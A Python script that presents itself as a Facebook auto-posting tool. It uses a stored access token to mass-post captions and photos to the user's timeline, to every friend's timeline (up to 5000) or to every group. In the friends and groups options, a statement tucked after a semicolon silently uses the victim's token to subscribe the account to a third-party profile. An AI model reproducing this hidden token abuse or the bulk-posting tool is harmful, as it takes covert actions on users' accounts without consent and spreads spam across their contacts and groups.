#!usr/bin/python3.7
#Author: KANG-NEWBIE
#contact: t.me/kang_nuubi
'''
recode? ok, but don't delete name author
'''

try:
	import requests,json,os,time,sys
	ket=open('toket/token.txt','r').read()
	def post(id,cap,poto,ket):
		dat={'access_token':ket,'message':cap}
		try:
			file={'file':open(poto,'rb')}
			rpost=requests.post('https://graph.facebook.com/'+id+'/photos?',data=dat,files=file)
			if 'error' in rpost.text:
				print("[-] Failed posting")
			else:
				print("[+] success with id - "+str(rpost.json()['post_id']))
		except:
			req=requests.post('https://graph.facebook.com/'+id+'/feed?',data=dat)
			if 'error' in req.text:
				print("[-] Failed posting")
			else:
				print("[!] success with id - "+str(req.json()['id']))
	
	print("""
	[ Auto Posting Status ]
	   [By:KANG-NEWBIE]

1.post in your timeline
2.post in friends timeline
3.post in your groups
""")
	
	pil=int(input("/kang_newbie_> "))
	if pil == 1:
		poto=input("\n[info] press enter to post without photos\n[?] path photos: ")
		cap=input("[info] type '<n>' for newlines\n[?] captions: ").replace('<n>','\n')
		id='me'
		post(id,cap,poto,ket)
	elif pil == 2:
		poto=input("\n[info] press enter to post without photos\n[?] path photos: ")
		cap=input("[info] type '<n>' for newlines\n[?] captions: ").replace('<n>','\n')
		r=requests.get('https://graph.facebook.com/me/?fields=friends.limit(5000)&access_token='+ket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ket)
		son=json.loads(r.text)['friends']
		for i in son['data']:
			post(i['id'],cap,poto,ket)
	elif pil == 3:
		poto=input("\n[info] press enter to post without photos\n[?] path photos: ")
		cap=input("[info] type '<n>' for newlines\n[?] captions: ").replace('<n>','\n')
		rr=requests.get('https://graph.facebook.com/me/groups?access_token='+ket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+ket)
		js=json.loads(rr.text)
		for i in js['data']:
			post(i['id'],cap,poto,ket)
		
except KeyboardInterrupt:
	exit("[exit] key interrupt")
except Exception as F:
	print("Err: %s"%(F))
